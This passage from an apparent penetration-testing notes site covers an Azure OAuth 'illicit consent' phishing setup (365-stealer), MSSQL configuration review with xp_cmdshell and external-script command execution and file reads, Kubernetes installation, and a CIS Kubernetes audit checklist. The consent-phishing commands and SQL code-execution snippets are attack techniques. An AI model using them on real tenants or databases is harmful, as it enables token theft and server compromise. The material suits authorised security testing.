deployed on a server to automatize token retrieval and use. Set the application permission The permission code can be found here Be careful, some rights need Administrator approval and users will not be able to accept them. Set the application permission a new manifest.json file: # manifest.json [ { \"resourceAppId\": \"00000003-0000-0000-c000-000000000000\", \"resourceAccess\": [ { \"id\": \"e1fe6dd8-ba31-4d61-89e7-88639da4683d\", \"type\": \"Scope\" }, { \"id\": \"863451e7-0667-486c-a5d6-d135439485f0\", \"type\": \"Scope\" } ] } ] Create a new application This application will authenticate the user and redirect him to the 365-stealer application deployed on a remote server. az ad app create --display-name ${appName} --available-to-other-tenants true --reply-urls https://${serverName}/login/authorized --oauth2-allow-implicit-flow false --required-resource-accesses @manifest.json az ad app owner add --owner-object cd60eb94-ad23-4cee-86cc-4819be4d6123 --id 7de80acb-4263-4a8f-9f8b-30b9abcab4e3 az ad app update --id 7de80acb-4263-4a8f-9f8b-30b9abcab4e3 --oauth2-allow-implicit-flow false az ad app update --id 7de80acb-4263-4a8f-9f8b-30b9abcab4e3 --set oauth2Permissions[0].isEnabled=false az ad app update --id 7de80acb-4263-4a8f-9f8b-30b9abcab4e3 --set oauth2Permissions=[] az ad app credential reset --id 7de80acb-4263-4a8f-9f8b-30b9abcab4e3 Send the malicious URL 'https://login.microsoftonline.com/common/oauth2/authorize?%20response_type=code&client_id=${applicationClientId}&redirect_uri${redirectUri}&response_mode=query' "},"Pentest/Configuration review/Database.html":{"url":"Pentest/Configuration review/Database.html","title":"Database","keywords":"","body":"Database Table of content MSSQL MSSQL Azure managed Configuration review Retrieve server options Transparent data encryption Encrypted connections Activate options xp_cmd_shell sp_execute_external_script Ole automation procedures Run external script File system Enumerate the files Read file content Retrieve role information References MSSQL MSSQL Azure managed There is a database gateway exposed on the common MSSQL port 1433, but when a connection is made, the connection is redirected to another server on port 1000X Configuration review Retrieve server options To retrieve server options, use the following SQLcommand SELECT * FROM sys.configurations It will display the status of options such as xp_cmd_shell or sp_execute_external_script Transparent data encryption It is possible to set transparent data encryption. To verify if data encryption is used : SELECT COUNT(*) FROM sys.dm_database_encryption_keys To enable data encryption on a specific database: ALTER DATABASE [database_name] SET ENCRYPTION ON; Encrypted connections Use the following SQL request to check the encryption status of the SQL connections SELECT encrypt_option FROM sys.dm_exec_connections Activate options xp_cmd_shell EXEC sp_configure 'show advanced options', 1 ; GO RECONFIGURE; GO EXEC sp_configure 'xp_cmdshell', 1 GO RECONFIGURE; GO sp_execute_external_script EXEC sp_configure 'show advanced options', 1 ; GO RECONFIGURE; EXECUTE sp_configure 'external scripts enabled', 1; GO RECONFIGURE; GO Ole automation procedures sp_configure 'show advanced options', 1; GO RECONFIGURE; GO sp_configure 'Ole Automation Procedures', 1; GO RECONFIGURE; GO Run external script On Azure MSSQL it is possible to run external Python or R script with the following command : EXEC sp_execute_external_script @language = N'R', @script = N'data.frame(print(system(\"cmd.exe /C whoami\", intern=T)))' Or, with a python script : EXECUTE sp_configure 'external scripts enabled', 1; GO RECONFIGURE; GO EXEC sp_execute_external_script @language = N'Python' , @script = N'import subprocess; cmd = [\"whoami\",\"ipconfig\"]; a = \"\"; for c in cmd: a += subprocess.check_output(c.split(\" \"), shell=True).decode()+\"\\r\\n\"; a = [elt for elt in a.split(\"\\r\\n\") if a.strip() != \"\"]; a = \"\\n\".join(a); print(a); ' GO File system Enumerate the files SELECT * FROM sys.dm_os_enumerate_filesystem('C:\\', '*'); Read file content SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS Contents Retrieve role information Security Audit Report List all access provisioned to a SQL user or Windows user/group directly List all access provisioned to a SQL user or Windows user/group through a database or application role List all access provisioned to the public role Columns Returned: UserType: Value will be either SQL User, Windows User, or Windows Group. This reflects the type of user/group defined for the SQL Server account. DatabaseUserName: Name of the associated user as defined in the database user account. The database user may not be the same as the server user. LoginName: SQL or Windows/Active Directory user account. This could also be an Active Directory group. Role: The role name. This will be null if the associated permissions to the object are defined at directly on the user account, otherwise this will be the name of the role that the user is a member of. PermissionType: Type of permissions the user/role has on an object. Examples could include CONNECT, EXECUTE, SELECT, DELETE, INSERT, ALTER, CONTROL, TAKE OWNERSHIP, VIEW,DEFINITION, etc. This value may not be populated for all roles. Some built in roles have implicit permission definitions. PermissionState : Reflects the state of the permission type, examples could include GRANT, DENY, etc. This value may not be populated for all roles. Some built in roles have implicit permission definitions. ObjectType : Type of object the user/role is assigned permissions on. Examples could include USER_TABLE, SQL_SCALAR_FUNCTION, SQL_INLINE_TABLE_VALUED_FUNCTION, SQL_STORED_PROCEDURE, VIEW, etc. This value may not be populated for all roles. Some built in roles have implicit permission definitions. Schema : Name of the schema the object is in. ObjectName : Name of the object that the user/role is assigned permissions on. This value may not be populated for all roles. Some built in roles have implicit permission definitions. ColumnName: Name of the column of the object that the user/role is assigned permissions on. This value is only populated if the object is a table, view or a table value function. ```SQL --1) List all access provisioned to a SQL user or Windows user/group directly SELECT [UserType] = CASE princ.[type] WHEN 'S' THEN 'SQL User' WHEN 'U' THEN 'Windows User' WHEN 'G' THEN 'Windows Group' END, [DatabaseUserName] = princ.[name], [LoginName] = ulogin.[name], [Role] = NULL, [PermissionType] = perm.[permission_name], [PermissionState] = perm.[state_desc], [ObjectType] = CASE perm.[class] WHEN 1 THEN obj.[type_desc] -- Schema-contained objects ELSE perm.[class_desc] -- Higher-level objects END, [Schema] = objschem.[name], [ObjectName] = CASE perm.[class] WHEN 3 THEN permschem.[name] -- Schemas WHEN 4 THEN imp.[name] -- Impersonations ELSE OBJECT_NAME(perm.[major_id]) -- General objects END, [ColumnName] = col.[name] FROM --Database user sys.database_principals AS princ --Login accounts LEFT JOIN sys.server_principals AS ulogin ON ulogin.[sid] = princ.[sid] --Permissions LEFT JOIN sys.database_permissions AS perm ON perm.[grantee_principal_id] = princ.[principal_id] LEFT JOIN sys.schemas AS permschem ON permschem.[schema_id] = perm.[major_id] LEFT JOIN sys.objects AS obj ON obj.[object_id] = perm.[major_id] LEFT JOIN sys.schemas AS objschem ON objschem.[schema_id] = obj.[schema_id] --Table columns LEFT JOIN sys.columns AS col ON col.[object_id] = perm.[major_id] AND col.[column_id] = perm.[minor_id] --Impersonations LEFT JOIN sys.database_principals AS imp ON imp.[principal_id] = perm.[major_id] WHERE princ.[type] IN ('S','U','G') -- No need for these system accounts AND princ.[name] NOT IN ('sys', 'INFORMATION_SCHEMA') UNION --2) List all access provisioned to a SQL user or Windows user/group through a database or application role SELECT [UserType] = CASE membprinc.[type] WHEN 'S' THEN 'SQL User' WHEN 'U' THEN 'Windows User' WHEN 'G' THEN 'Windows Group' END, [DatabaseUserName] = membprinc.[name], [LoginName] = ulogin.[name], [Role] = roleprinc.[name], [PermissionType] = perm.[permission_name], [PermissionState] = perm.[state_desc], [ObjectType] = CASE perm.[class] WHEN 1 THEN obj.[type_desc] -- Schema-contained objects ELSE perm.[class_desc] -- Higher-level objects END, [Schema] = objschem.[name], [ObjectName] = CASE perm.[class] WHEN 3 THEN permschem.[name] -- Schemas WHEN 4 THEN imp.[name] -- Impersonations ELSE OBJECT_NAME(perm.[major_id]) -- General objects END, [ColumnName] = col.[name] FROM --Role/member associations sys.database_role_members AS members --Roles JOIN sys.database_principals AS roleprinc ON roleprinc.[principal_id] = members.[role_principal_id] --Role members (database users) JOIN sys.database_principals AS membprinc ON membprinc.[principal_id] = members.[member_principal_id] --Login accounts LEFT JOIN sys.server_principals AS ulogin ON ulogin.[sid] = membprinc.[sid] --Permissions LEFT JOIN sys.database_permissions AS perm ON perm.[grantee_principal_id] = roleprinc.[principal_id] LEFT JOIN sys.schemas AS permschem ON permschem.[schema_id] = perm.[major_id] LEFT JOIN sys.objects AS obj ON obj.[object_id] = perm.[major_id] LEFT JOIN sys.schemas AS objschem ON objschem.[schema_id] = obj.[schema_id] --Table columns LEFT JOIN sys.columns AS col ON col.[object_id] = perm.[major_id] AND col.[column_id] = perm.[minor_id] --Impersonations LEFT JOIN sys.database_principals AS imp ON imp.[principal_id] = perm.[major_id] WHERE membprinc.[type] IN ('S','U','G') -- No need for these system accounts AND membprinc.[name] NOT IN ('sys', 'INFORMATION_SCHEMA') UNION --3) List all access provisioned to the public role, which everyone gets by default SELECT [UserType] = '{All Users}', [DatabaseUserName] = '{All Users}', [LoginName] = '{All Users}', [Role] = roleprinc.[name], [PermissionType] = perm.[permission_name], [PermissionState] = perm.[state_desc], [ObjectType] = CASE perm.[class] WHEN 1 THEN obj.[type_desc] -- Schema-contained objects ELSE perm.[class_desc] -- Higher-level objects END, [Schema] = objschem.[name], [ObjectName] = CASE perm.[class] WHEN 3 THEN permschem.[name] -- Schemas WHEN 4 THEN imp.[name] -- Impersonations ELSE OBJECT_NAME(perm.[major_id]) -- General objects END, [ColumnName] = col.[name] FROM --Roles sys.database_principals AS roleprinc --Role permissions LEFT JOIN sys.database_permissions AS perm ON perm.[grantee_principal_id] = roleprinc.[principal_id] LEFT JOIN sys.schemas AS permschem ON permschem.[schema_id] = perm.[major_id] --All objects JOIN sys.objects AS obj ON obj.[object_id] = perm.[major_id] LEFT JOIN sys.schemas AS objschem ON objschem.[schema_id] = obj.[schema_id] --Table columns LEFT JOIN sys.columns AS col ON col.[object_id] = perm.[major_id] AND col.[column_id] = perm.[minor_id] --Impersonations LEFT JOIN sys.database_principals AS imp ON imp.[principal_id] = perm.[major_id] WHERE roleprinc.[type] = 'R' AND roleprinc.[name] = 'public' AND obj.[is_ms_shipped] = 0 ORDER BY [UserType], [DatabaseUserName], [LoginName], [Role], [Schema], [ObjectName], [ColumnName], [PermissionType], [PermissionState], [ObjectType] ``` References https://blog.dbdigger.com/enable-and-work-with-xp_cmdshell-in-sql-server-2008-r2/ https://stackoverflow.com/questions/7048839/sql-server-query-to-find-all-permissions-access-for-all-users-in-a-database https://labs.f-secure.com/assets/BlogFiles/mwri-a-penetration-testers-guide-to-the-azure-cloud-v1.2.pdf https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-credential-passwords/ "},"Pentest/Configuration review/Kubernetes.html":{"url":"Pentest/Configuration review/Kubernetes.html","title":"Kubernetes","keywords":"","body":"Kubernetes Table of content Main concepts Container Runtime Interface (CRI) Master Node Pod Network Controller (PNC) Services Commands List nodes List pods Display information about a pod Describe deployment Execute command on a pod Install Install the CRI Install Kubernetes Network Init the master node Install the PNC Resources Main concepts Container Runtime Interface (CRI) The CRIis the service that will handle the container created by Kubernetes. The most famous one is Docker but others can be used such as containerd that is today officialy pushed by Kubernetes. Docker is now depracted by Kubernetescause it does not expose a standardized API. Moreover, Docker is not a CRI but a wrapper allowing to easily manage the containerd CRI. This, if you are deploying a brand new Kubernetes infrastructure, it is recommended to use containerd. Master Node This node is used to orchestrate all nodes. It hosts the Kubernetes API. Pod Network Controller (PNC) A Pod Network is a way to allow communication between different nodes in the cluster. Installing a PNC is a way to save a lot of time by discharging the network configuration to another service. Several PNC exist. The most famous are : Flannel : this PNC is a layer 3 controller based on VLAN Calico : this PNC is a layer 2 controller base on NAT et supporte les networkPoliciesde Kubernetes via le fichier /etc/calico/calicoctl.cfg Services The services allows to expose an application running on pods kubectl expose deployment/${deployementName} --type=\"NodePort\" --port ${appPort} --target-port Commands List nodes kubectl get nodes List pods kubectl get pods ${options} --all-namespaces : display all pods whatever their namespaces -l app=$appName : display the pods related to an application. The $appName must be the one set on application the deployment file. Display information about a pod kubectl describe pod ${podName} The ${podName} is the name displayed by the get pods command. Describe deployment kubectl describe deployment ${deploymentName} Execute command on a pod kubectl exec -ti ${podName} Install Install the CRI # Install contnaird curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add - sudo echo \"deb [arch=amd64] https://download.docker.com/linux/debian buster stable\" > /etc/apt sources.list.d/docker.list sudo apt update sudo apt install containerd sudo rm /etc/containerd/config.toml sudo systemctl restart containerd Install Kubernetes curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add - echo \"deb http://apt.kubernetes.io/ kubernetes-xenial main\" > /etc/apt/sources.list.d/kubernetes.list apt update apt install kubeadm kubelet kubectl -y Network sudo modprobe overlay sudo br_netfilter sudo modprobe br_netfilter sudo swapoff -a sudo sysctl -w net.ipv4.ip_forward=1 sudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf sudo sysctl -p /etc/sysctl.conf Init the master node sudo kubeadm init --cri-socket /run/containerd/containerd.sock --pod-network-cidr=10.244.0.0/16 sudo mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config Install the PNC kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml Resources Set up a cluster : https://phoenixnap.com/kb/install-kubernetes-on-ubuntu PNC summary : https://www.objectif-libre.com/fr/blog/2018/07/05/comparatif-solutions-reseaux-kubernetes/ Create the first application : https://kubernetes.io/docs/tasks/run-application/run-stateless-application-deployment/ Production readiness : https://learnk8s.io/production-best-practices "},"Pentest/Configuration review/KubernetesCIS.html":{"url":"Pentest/Configuration review/KubernetesCIS.html","title":"KubernetesCIS","keywords":"","body":"Audit de configuration Kubernetes Table of content Minimal files to asks Master and Worker node API Résumé des commandes Descriptif des tests Test 0 Test 1 Test 2 Test 3 Test 4 Test 5 Test 6 Test 7 Test 8 Test 9 Test 10 Test 11 Test 12 Test 13 Test 14 Test 15 Test 16 Test 17 Test 18 Test 19 Test 20 Test 21 Test 22 Test 23 Test 24 Test 25 Test 26 Test 27 Test 28 Test 29 Test 30 Test 31 Test 32 Test 33 Test 34 Test 35 Test 36 Test 37 Test 38 Test 39 Test 40 Test 41 Test 42 Test 43 Test 44 Test 45 Test 46 Test 47 Test 48 Test 49 Test 50 Test 51 Test 52 Test 53 Test 54 Test 55 Test 56 Test 57 Test 58 Test 59 Test 60 Test 61 Test 62 Test 63 Test 64 Test 65 Test 66 Test 67 Test 68 Test 69 Test 70 Test 71 Test 72 Test 73 Test 74 Test 75 Test 76 Test 77 Test 78 Test 79 Test 80 Test 81 Test 82 Test 83 Test 84 Test 85 Test 86 Test 87 Test 88 Test 89 Test 90 Test 91 Test 92 Test 93 Test 94 Test 95 Test 96 Test 97 Test 98 Test 99 Test 100 Test 101 Test 102 Test 103 Test 104 Test 105 Test 106 Test 107 Test 108 Test 109 Test 110 Test 111 Test 112 Test 113 Test 114 Test 115 Test 116 Test 117 Test 118 Test 119 Test 120 Test 121 Test 122 Test 123 Minimal files to asks Master and Worker node Output of these commandsfind /etc -ls ps -ef iptables -L Every files in /etc/kubernetes API Retrieve these information in YAML format : Namespace ClusterRole ClusterRoleBindings Role (for every namespaces) RoleBindings (for every namespaces) Group Pod (for every namespaces) ServiceAccount (for every namespaces) PodSecurityPolicy Network Policies depending on the CNI (Container Network Interface) used Depending on the Kubernetes authentication mode : the related configuration if it is managed by a Kubernetes component. Résumé des commandes These command are here to help during the extraction. All commands are not compiled here. Moreover, some parameters and absolute path may differ depending on the environment. stat -c %a /etc/kubernetes/manifests/kube-apiserver.yaml stat -c %U:%G /etc/kubernetes/manifests/kube-apiserver.yaml stat -c %a /etc/kubernetes/manifests/kube-controller-manager.yaml stat -c %U:%G /etc/kubernetes/manifests/kube-controller-manager.yaml stat -c %a /etc/kubernetes/manifests/kube-scheduler.yaml stat -c %U:%G /etc/kubernetes/manifests/kube-scheduler.yaml stat -c %a /etc/kubernetes/manifests/etcd.yaml stat -c %U:%G /etc/kubernetes/manifests/etcd.yaml stat -c %a stat -c %U:%G stat -c %a /var/lib/etcd stat -c %U:%G /var/lib/etcd stat -c %a /etc/kubernetes/admin.conf stat -c %U:%G /etc/kubernetes/admin.conf stat -c %a /etc/kubernetes/scheduler.conf stat -c %U:%G /etc/kubernetes/scheduler.conf stat -c %a /etc/kubernetes/controller-manager.conf stat -c %U:%G /etc/kubernetes/controller-manager.conf ls -laR /etc/kubernetes/pki/ ls -laR /etc/kubernetes/pki/*.crt ls -laR /etc/kubernetes/pki/*.key ps -ef | grep kube-apiserver ps -ef | grep kube-controller-manager ps -ef | grep kube-scheduler ps -ef | grep etcd ps -ef | grep apiserver stat -c %a /etc/systemd/system/kubelet.service.d/10-kubeadm.conf stat -c %a stat -c %U:%G stat -c %a /etc/kubernetes/kubelet.conf stat -c %U %G /etc/kubernetes/kubelet.conf stat -c %a stat -c %U:%G stat -c %a /var/lib/kubelet/config.yaml ps -ef | grep kubelet ps -ef | grep kubelet kubectl get clusterrolebindings -o=customcolumns=NAME:.metadata.name,ROLE:.roleRef.name,SUBJECT:.subjects[*].name kubectl get roles --all-namespaces -o yaml kubectl get clusterroles -o yaml kubectl get psp kubectl get psp -o=jsonpath='{.spec.privileged}' kubectl get psp -o=jsonpath='{.spec.hostPID}' kubectl get psp -o=jsonpath='{.spec.hostIPC}' kubectl get psp -o=jsonpath='{.spec.hostNetwork}' kubectl get psp -o=jsonpath='{.spec.allowPrivilegeEscalation}' kubectl get psp -o=jsonpath='{.spec.runAsUser.rule}' kubectl get psp -o=jsonpath='{.spec.requiredDropCapabilities}' kubectl --all-namespaces get networkpolicy kubectl get all -o jsonpath='{range .items[?(@..secretKeyRef)]} {.kind} {.metadata.name} {\"\\n\"}{end}' -A kubectl get namespaces kubectl get all Descriptif des tests These tests are here to help during the extract analysis. Tests and verifications must be adapted depending on the environment and the context. This tests are extracted from the Center for Internet Security Kurbenetes Benchmark Moreover, some parameters and absolute path may differ depending on the environment. Test 0 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %a /etc/kubernetes/manifests/kube-apiserver.yaml verif: Verify that the permissions are 644 or more restrictive. Test 1 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G /etc/kubernetes/manifests/kube-apiserver.yaml verif: Verify that the ownership is set to root:root. Test 2 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %a /etc/kubernetes/manifests/kube-controller-manager.yaml verif: Verify that the permissions are 644 or more restrictive. Test 3 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G /etc/kubernetes/manifests/kube-controller-manager.yaml verif: Verify that the ownership is set to root:root. Test 4 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %a /etc/kubernetes/manifests/kube-scheduler.yaml verif: Verify that the permissions are 644 or more restrictive. Test 5 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G /etc/kubernetes/manifests/kube-scheduler.yaml verif: Verify that the ownership is set to root:root. Test 6 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %a /etc/kubernetes/manifests/etcd.yaml verif: Verify that the permissions are 644 or more restrictive. Test 7 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G /etc/kubernetes/manifests/etcd.yaml verif: Verify that the ownership is set to root:root. Test 8 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %a verif: Verify that the permissions are 644 or more restrictive. Test 9 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G verif: Verify that the ownership is set to root:root. Test 10 test: On the etcd server node, get the etcd data directory, passed as an argument --data-dir, from the below command: ps -ef | grep etcd. Run the below command (based on the etcd data directory found above). command: stat -c %a /var/lib/etcd verif: Verify that the permissions are 700 or more restrictive. Test 11 test: On the etcd server node, get the etcd data directory, passed as an argument --data-dir, from the below command: ps -ef | grep etcd. Run the below command (based on the etcd data directory found above). command: stat -c %U:%G /var/lib/etcd verif: Verify that the ownership is set to etcd:etcd. Test 12 test: Run the following command (based on the file location on your system) on the master node. command: stat -c %a /etc/kubernetes/admin.conf verif: Verify that the permissions are 644 or more restrictive. Test 13 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G /etc/kubernetes/admin.conf verif: Verify that the ownership is set to root:root. Test 14 test: Run the following command (based on the file location on your system) on the master node. command: stat -c %a /etc/kubernetes/scheduler.conf verif: Verify that the permissions are 644 or more restrictive. Test 15 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G /etc/kubernetes/scheduler.conf verif: Verify that the ownership is set to root:root. Test 16 test: Run the following command (based on the file location on your system) on the master node. command: stat -c %a /etc/kubernetes/controller-manager.conf verif: Verify that the permissions are 644 or more restrictive. Test 17 test: Run the below command (based on the file location on your system) on the master node. command: stat -c %U:%G /etc/kubernetes/controller-manager.conf verif: Verify that the ownership is set to root:root. Test 18 test: Run the below command (based on the file location on your system) on the master node. command: ls -laR /etc/kubernetes/pki/ verif: Verify that the ownership of all files and directories in this hierarchy is set to root:root. Test 19 test: Run the below command (based on the file location on your system) on the master node. command: ls -laR /etc/kubernetes/pki/*.crt verif: Verify that the permissions are 644 or more restrictive. Test 20 test: Run the below command (based on the file location on your system) on the master node. command: ls -laR /etc/kubernetes/pki/*.key verif: Verify that the permissions are 600. Test 21 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --anonymous-auth argument is set to false. Test 22 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --token-auth-file argument does not exist. Test 23 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --kubelet-https argument either does not exist or is set to true. Test 24 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --kubelet-client-certificate and --kubelet-client-key arguments exist and they are set as appropriate. Test 25 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --kubelet-certificate-authority argument exists and is set as appropriate. Test 26 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --authorization-mode argument exists and is not set to AlwaysAllow. Test 27 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --authorization-mode argument exists and is set to a value to include Node. Test 28 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --authorization-mode argument exists and is set to a value to include RBAC. Test 29 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --enable-admission-plugins argument is set to a value that includes EventRateLimit. Test 30 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that if the --enable-admission-plugins argument is set, its value does not include AlwaysAdmit. Test 31 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --enable-admission-plugins argument is set to a value that includes AlwaysPullImages. Test 32 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --enable-admission-plugins argument is set to a value that includesSecurityContextDeny, if PodSecurityPolicy is not included. Test 33 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --disable-admission-plugins argument is set to a value that does not includes ServiceAccount. Test 34 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --disable-admission-plugins argument is set to a value that does not include NamespaceLifecycle. Test 35 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --enable-admission-plugins argument is set to a value that includes PodSecurityPolicy. Test 36 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --enable-admission-plugins argument is set to a value that includes NodeRestriction. Test 37 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --insecure-bind-address argument does not exist. Test 38 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --insecure-port argument is set to 0. Test 39 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --secure-port argument is either not set or is set to an integer value between 1 and 65535. Test 40 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --profiling argument is set to false. Test 41 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --audit-log-path argument is set as appropriate. Test 42 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --audit-log-maxage argument is set to 30 or as appropriate. Test 43 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --audit-log-maxbackup argument is set to 10 or as appropriate. Test 44 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --audit-log-maxsize argument is set to 100 or as appropriate. Test 45 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --request-timeout argument is either not set or set to an appropriate value. Test 46 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that if the --service-account-lookup argument exists it is set to true. Test 47 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --service-account-key-file argument exists and is set as appropriate. Test 48 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --etcd-certfile and --etcd-keyfile arguments exist and they are set as appropriate. Test 49 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --tls-cert-file and --tls-private-key-file arguments exist and they are set as appropriate. Test 50 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --client-ca-file argument exists and it is set as appropriate. Test 51 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --etcd-cafile argument exists and it is set as appropriate. Test 52 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --encryption-provider-config argument is set to a EncryptionConfig file. Additionally, ensure that the EncryptionConfig file has all the desired resources covered especially any secrets. Test 53 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Get the EncryptionConfig file set for --encryption-provider-config argument. Verify that aescbc, kms or secretbox is set as the encryption provider for all the desired resources. Test 54 test: Run the following command on the master node: command: ps -ef | grep kube-apiserver verif: Verify that the --tls-cipher-suites argument is set as outlined in the remediation procedure below. Test 55 test: Run the following command on the master node: command: ps -ef | grep kube-controller-manager verif: Verify that the --terminated-pod-gc-threshold argument is set as appropriate. Test 56 test: Run the following command on the master node: command: ps -ef | grep kube-controller-manager verif: Verify that the --profiling argument is set to false. Test 57 test: Run the following command on the master node: command: ps -ef | grep kube-controller-manager verif: Verify that the --use-service-account-credentials argument is set to true. Test 58 test: Run the following command on the master node: command: ps -ef | grep kube-controller-manager verif: Verify that the --service-account-private-key-file argument is set as appropriate. Test 59 test: Run the following command on the master node: command: ps -ef | grep kube-controller-manager verif: Verify that the --root-ca-file argument exists and is set to a certificate bundle file containing the root certificate for the API server's serving certificate. Test 60 test: Run the following command on the master node: command: ps -ef | grep kube-controller-manager verif: Verify that RotateKubeletServerCertificate argument exists and is set to true. Test 61 test: Run the following command on the master node: command: ps -ef | grep kube-controller-manager verif: Verify that the --bind-address argument is set to 127.0.0.1 Test 62 test: Run the following command on the master node: command: ps -ef | grep kube-scheduler verif: Verify that the --profiling argument is set to false. Test 63 test: Run the following command on the master node: command: ps -ef | grep kube-scheduler verif: Verify that the --bind-address argument is set to 127.0.0.1 Test 64 test: Run the following command on the etcd server node command: ps -ef | grep etcd verif: Verify that the --cert-file and the --key-file arguments are set as appropriate. Test 65 test: Run the following command on the etcd server node: command: ps -ef | grep etcd verif: Verify that the --client-cert-auth argument is set to true. Test 66 test: Run the following command on the etcd server node: command: ps -ef | grep etcd verif: Verify that if the --auto-tls argument exists, it is not set to true. Test 67 test: Run the following command on the etcd server node: command: ps -ef | grep etcd verif: Verify that the --peer-cert-file and --peer-key-file arguments are set as appropriate. Note: This recommendation is applicable only for etcd clusters. If you are using only one etcd server in your environment then this recommendation is not applicable. Test 68 test: Run the following command on the etcd server node: command: ps -ef | grep etcd verif: Verify that the --peer-client-cert-auth argument is set to true. Note: This recommendation is applicable only for etcd clusters. If you are using only one etcd server in your environment then this recommendation is not applicable. Test 69 test: Run the following command on the etcd server node: command: ps -ef | grep etcd verif: Verify that if the --peer-auto-tls argument exists, it is not set to true. Note: This recommendation is applicable only for etcd clusters. If you are using only one etcd server in your environment then this recommendation is not applicable. Test 70 test: Review the CA used by the etcd environment and ensure that it does not match the CA certificate file used for the management of the overall Kubernetes cluster. Run the following command on the master node: ps -ef | grep etcd. Note the file referenced by the --trusted-ca-file argument. Run the following command on the master node: command: ps -ef | grep apiserver verif: Verify that the file referenced by the --client-ca-file for apiserver is different from the --trusted-ca-file used by etcd. Test 71 test: Review user access to the cluster and ensure that users are not making use of Kubernetes client certificate authentication. command: verif: Test 72 test: Run the following command on one of the cluster master nodes: command: ps -ef | grep kube-apiserver verif: Verify that the --audit-policy-file is set. Review the contents of the file specified and ensure that it contains a valid audit policy. Test 73 test: Review the audit policy provided for the cluster and ensure that it covers at least the following areas : / Access to Secrets managed by the cluster. / Modification of pod and deployment objects. / Use of pods or exec, pods or portforward, pods or proxy and services or proxy. For most requests, minimally logging at the Metadata level is recommended (the most basic level of logging). command: # NO COMMAND verif: Care should be taken to only log Metadata for requests to Secrets, ConfigMaps, and TokenReviews, in order to avoid the risk of logging sensitive data. Test 74 test: Run the below command (based on the file location on your system) on the each worker node. command: stat -c %a /etc/systemd/system/kubelet.service.d/10-kubeadm.conf verif: Verify that the permissions are 644 or more restrictive. Test 75 test: Run the below command (based on the file location on your system) on the each worker node. command: stat -c %a /etc/systemd/system/kubelet.service.d/10-kubeadm.conf verif: Verify that the ownership is set to root:root. Test 76 test: Find the kubeconfig file being used by kube-proxy by running the following command: ps -ef | grep kube-proxy. If kube-proxy is running, get the kubeconfig file location from the --kubeconfig parameter. Run the below command (based on the file location on your system) on the each worker node. command: stat -c %a verif: Verify that a file is specified and it exists with permissions are 644 or more restrictive. Test 77 test: Find the kubeconfig file being used by kube-proxy by running the following command: ps -ef | grep kube-proxy. If kube-proxy is running, get the kubeconfig file location from the --kubeconfig parameter. Run the below command (based on the file location on your system) on the each worker node. command: stat -c %U:%G verif: Verify that the ownership is set to root:root. Test 78 test: Run the below command (based on the file location on your system) on the each worker node. For example, command: stat -c %a /etc/kubernetes/kubelet.conf verif: Verify that the ownership is set to root:root.Verify that the permissions are 644 or more restrictive. Test 79 test: Run the below command (based on the file location on your system) on the each worker node. command: stat -c %U %G /etc/kubernetes/kubelet.conf verif: Verify that the ownership is set to root:root. Test 80 test: Run the following command: ps -ef | grep kubelet. Find the file specified by the --client-ca-file argument. Run the following command: command: stat 